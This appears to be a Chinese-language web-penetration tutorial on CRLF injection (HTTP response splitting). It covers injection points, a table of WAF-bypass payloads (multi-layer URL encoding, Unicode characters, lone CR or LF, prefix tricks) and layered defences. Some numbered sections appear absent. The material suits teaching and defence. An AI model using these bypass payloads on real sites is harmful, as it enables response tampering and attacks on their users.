CRLF 注入（HTTP 响应拆分）

2026-06-28 WEB渗透 ， 基础漏洞

一、什么是 CRLF

CRLF 是 CR（回车，\r，%0d）+ LF（换行，\n，%0a） 的组合。在 HTTP 协议里，这个组合子是骨架级的角色：

  • 请求行 / 响应行 以一个 CRLF 结尾
  • 每个 HTTP 头 以一个 CRLF 结尾
  • 响应头与 Body 之间 用两个连续的 CRLF（\r\n\r\n）隔开

说白了，浏览器和服务端就是靠 \r\n 来认「这个头到哪结束、Body 从哪开始」的。一旦用户输入能往响应头里塞 \r\n，整个响应结构就被接管了。

二、漏洞原理

漏洞本质：Web 应用把用户输入写进 HTTP 响应头时，没有过滤 CRLF 字符。

常见注入点：

注入位置 典型参数名 / 场景
URL 跳转参数 ?url= ?redirect= ?next= ?return=
自定义响应头 从用户输入取值后 set_header()
URL 路径本身 /path%0d%0aHeader:value
Referer / User-Agent 回显 页面把请求头原样输出到响应

四、绕过手法

WAF 和过滤规则日常盯的是 %0d%0a 和 \r\n 这些直白写法：

绕过方式 Payload 原理
双重 URL 编码 %250d%250a WAF 解码一次得 %0d%0a，应用再解码一次生效
Unicode 绕过（Node.js < v10） čĊ（čĊ） 高位截断后 č → \r，Ċ → \n
只用 LF %0a 很多场景仅换行就能分隔，规则只知道拦 %0d%0a
只用 CR %0d 旧版浏览器 / 服务器对孤立的 \r 也认
注释前缀干扰 %23%0d%0a # 让前面的内容变成注释，绕过正则检测
问号前缀 %3f%0d%0a 参数分隔符混淆过滤引擎
多层编码 %2525250d%2525250a 多层递归解码埋过 WAF 的检测深度

六、防御

层级 措施
输入 拦截 \r、\n、%0d、%0a 及 Unicode 等价字符，白名单优于黑名单
输出 写入响应头前，对控制字符做 URL 编码或直接拒绝写入
框架 用语言 / 框架自带 API：Java setHeader() 会在值含换行时抛异常、Node.js response.setHeader() 同理。永远不要手动拼字符串进响应头
架构 CDN / 反向代理层加 CRLF 过滤；对敏感响应禁用缓存或加 Vary 头
